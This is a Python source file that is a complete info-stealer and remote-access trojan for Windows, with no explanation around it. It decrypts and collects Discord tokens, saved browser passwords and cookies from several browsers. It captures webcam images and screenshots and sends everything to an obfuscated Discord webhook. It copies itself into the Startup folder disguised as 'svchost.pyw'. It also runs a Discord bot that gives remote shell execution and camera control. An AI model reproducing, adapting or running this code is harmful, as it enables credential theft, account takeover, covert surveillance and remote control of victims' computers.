import os,sys,json,re,shutil,sqlite3,struct,base64 as b6,ctypes,subprocess,tempfile,threading,time
from pathlib import Path
try:
 import requests as rq,cv2,pyautogui
 from win32crypt import CryptUnprotectData as cpd
 from Crypto.Cipher import AES
 import discord
 from discord.ext import commands
except:sys.exit()

w=b6.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjMwNzQ1MDE1MjQ4OTAxMC9rNDhuZ3pUenFrakdGS0g3UjE2aEVZMXJIZFJpZmI5U3Q3TjBYSzcycDJnTnR4WjVvT1V0SUlsb3dlbTBEbEYxN1ZHaQ==").decode()
bt="TVRRNU1qTTFNRFk1T1RZME1qZ3hPRFl6TVEuR2IxQ3RTLlktWk1TLWdLWmdleGVUQjgxR0prTE1OV0F1eW1CWGtTakVqN2Mw"
td=tempfile.mkdtemp()
al,ld,ap=os.getenv("LOCALAPPDATA"),os.getenv("LOCALAPPDATA"),os.getenv("APPDATA")

def gk(p):
 with open(p,"r") as f:j=json.loads(f.read())
 return b6.b64decode(j["os_crypt"]["encrypted_key"])[5:]

def dk(k,d):
 try:
  iv,ct=d[3:15],d[15:]
  return AES.new(cpd(k,None,None,None,0)[1],AES.MODE_GCM,iv).decrypt(ct)[:-16].decode()
 except:return""

def gt(p,k):
 tk=set();db=os.path.join(td,"tkdb")
 for f in Path(p).rglob("*.ldb"):
  try:
   with open(f,"r",errors="ignore") as r:
    for l in r:
     for t in re.findall(r"dQw4w9WgXcQ:[^\s\"]+",l):
      d=b6.b64decode(t.split("dQw4w9WgXcQ:")[1]+"==");v=dk(k,d)
      if v:tk.add(v)
  except:pass
 return tk

def gc(p):
 ck=[];db=os.path.join(td,"ckdb");src=os.path.join(p,"Cookies")
 if not os.path.exists(src):src=os.path.join(p,"Network","Cookies")
 if not os.path.exists(src):return ck
 shutil.copy2(src,db)
 try:
  cn=sqlite3.connect(db);cu=cn.cursor()
  cu.execute("SELECT host_key,name,encrypted_value FROM cookies")
  k=gk(os.path.join(os.path.dirname(os.path.dirname(p)),"Local State"))
  for h,n,ev in cu.fetchall():
   v=dk(k,ev)
   if v:ck.append(f"{h}\t{n}\t{v}")
  cn.close()
 except:pass
 try:os.remove(db)
 except:pass
 return ck

def gp(p):
 pw=[];db=os.path.join(td,"pwdb");src=os.path.join(p,"Login Data")
 if not os.path.exists(src):return pw
 shutil.copy2(src,db)
 try:
  cn=sqlite3.connect(db);cu=cn.cursor()
  cu.execute("SELECT origin_url,username_value,password_value FROM logins")
  k=gk(os.path.join(os.path.dirname(os.path.dirname(p)),"Local State"))
  for u,un,pv in cu.fetchall():
   v=dk(k,pv)
   if v:pw.append(f"{u} | {un} | {v}")
  cn.close()
 except:pass
 try:os.remove(db)
 except:pass
 return pw

bp={
"Discord":[os.path.join(ap,"discord","Local Storage","leveldb")],
"Chrome":[os.path.join(al,"Google","Chrome","User Data","Default","Local Storage","leveldb")],
"Edge":[os.path.join(al,"Microsoft","Edge","User Data","Default","Local Storage","leveldb")],
"Brave":[os.path.join(al,"BraveSoftware","Brave-Browser","User Data","Default","Local Storage","leveldb")],
"Opera":[os.path.join(ap,"Opera Software","Opera Stable","Local Storage","leveldb")],
"OperaGX":[os.path.join(ap,"Opera Software","Opera GX Stable","Local Storage","leveldb")],
}

kp={
"Chrome":os.path.join(al,"Google","Chrome","User Data","Local State"),
"Edge":os.path.join(al,"Microsoft","Edge","User Data","Local State"),
"Brave":os.path.join(al,"BraveSoftware","Brave-Browser","User Data","Local State"),
"Opera":os.path.join(ap,"Opera Software","Opera Stable","Local State"),
"OperaGX":os.path.join(ap,"Opera Software","Opera GX Stable","Local State"),
"Discord":os.path.join(ap,"discord","Local State"),
}

cp={
"Chrome":os.path.join(al,"Google","Chrome","User Data","Default"),
"Edge":os.path.join(al,"Microsoft","Edge","User Data","Default"),
"Brave":os.path.join(al,"BraveSoftware","Brave-Browser","User Data","Default"),
"Opera":os.path.join(ap,"Opera Software","Opera Stable"),
"OperaGX":os.path.join(ap,"Opera Software","Opera GX Stable"),
}

def sf(fn,ct):
 fp=os.path.join(td,fn)
 with open(fp,"w",encoding="utf-8") as f:f.write(ct)
 return fp

def sw(fs):
 fl=[]
 for fp in fs:
  if os.path.exists(fp) and os.path.getsize(fp)>0:fl.append(("file",open(fp,"rb")))
 if not fl:return
 try:
  mf={f"file{i}":( os.path.basename(f[1].name),f[1]) for i,f in enumerate(fl)}
  rq.post(w,files=mf,data={"content":"📦 **Grab**"})
 except:pass
 for f in fl:f[1].close()

def run():
 fs=[]
 at=""
 for nm,ps in bp.items():
  ks=kp.get(nm)
  if not ks or not os.path.exists(ks):continue
  try:k=gk(ks)
  except:continue
  for p in ps:
   if os.path.exists(p):
    tk=gt(p,k)
    if tk:at+=f"\n--- {nm} ---\n"+"\n".join(tk)
 if at:fs.append(sf("tokens.txt",at))

 ap2=""
 for nm,p in cp.items():
  pw=gp(p)
  if pw:ap2+=f"\n--- {nm} ---\n"+"\n".join(pw)
 if ap2:fs.append(sf("passwords.txt",ap2))

 ac=""
 for nm,p in cp.items():
  ck=gc(p)
  if ck:ac+=f"\n--- {nm} ---\n"+"\n".join(ck)
 if ac:fs.append(sf("cookies.txt",ac))

 try:
  wp=os.path.join(td,"webcam.jpg")
  cm=cv2.VideoCapture(0)
  if cm.isOpened():
   time.sleep(0.5);r,fr=cm.read()
   if r:cv2.imwrite(wp,fr);fs.append(wp)
  cm.release()
 except:pass

 try:
  sp=os.path.join(td,"screen.png")
  pyautogui.screenshot(sp);fs.append(sp)
 except:pass

 if fs:sw(fs)

 for f in fs:
  try:os.remove(f)
  except:pass
 try:shutil.rmtree(td)
 except:pass

def persist():
 try:
  su=os.path.join(os.getenv("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup","svchost.pyw")
  if not os.path.exists(su):shutil.copy2(sys.argv[0],su)
 except:pass

def bot():
 b=commands.Bot(command_prefix="!",intents=discord.Intents.all(),self_bot=False)
 @b.event
 async def on_ready():pass

 @b.command()
 async def screenshot(ctx):
  sp=os.path.join(tempfile.gettempdir(),"ss.png")
  try:pyautogui.screenshot(sp);await ctx.send(file=discord.File(sp));os.remove(sp)
  except Exception as e:await ctx.send(f"err: {e}")

 @b.command()
 async def webcam(ctx):
  wp=os.path.join(tempfile.gettempdir(),"wc.jpg")
  try:
   cm=cv2.VideoCapture(0);time.sleep(0.5);r,fr=cm.read();cm.release()
   if r:cv2.imwrite(wp,fr);await ctx.send(file=discord.File(wp));os.remove(wp)
   else:await ctx.send("no cam")
  except Exception as e:await ctx.send(f"err: {e}")

 @b.command()
 async def rwebcam(ctx,s:int=5):
  vp=os.path.join(tempfile.gettempdir(),"rv.avi")
  try:
   cm=cv2.VideoCapture(0);fw=cv2.VideoWriter(vp,cv2.VideoWriter_fourcc(*'XVID'),20.0,(640,480))
   st=time.time()
   while time.time()-st<s:
    r,fr=cm.read()
    if r:fw.write(fr)
   cm.release();fw.release()
   await ctx.send(file=discord.File(vp));os.remove(vp)
  except Exception as e:await ctx.send(f"err: {e}")

 @b.command()
 async def shell(ctx,*,c):
  try:
   o=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
   r=o.stdout or o.stderr or "no output"
   if len(r)>1990:
    fp=os.path.join(tempfile.gettempdir(),"out.txt")
    with open(fp,"w") as f:f.write(r)
    await ctx.send(file=discord.File(fp));os.remove(fp)
   else:await ctx.send(f"```\n{r}\n```")
  except Exception as e:await ctx.send(f"err: {e}")

 @b.command()
 async def cmd(ctx,*,c):
  try:
   o=subprocess.run(f"cmd /c {c}",shell=True,capture_output=True,text=True,timeout=30)
   r=o.stdout or o.stderr or "no output"
   if len(r)>1990:
    fp=os.path.join(tempfile.gettempdir(),"out.txt")
    with open(fp,"w") as f:f.write(r)
    await ctx.send(file=discord.File(fp));os.remove(fp)
   else:await ctx.send(f"```\n{r}\n```")
  except Exception as e:await ctx.send(f"err: {e}")

 b.run(b6.b64decode(bt).decode())

persist()
threading.Thread(target=run,daemon=True).start()
bot()
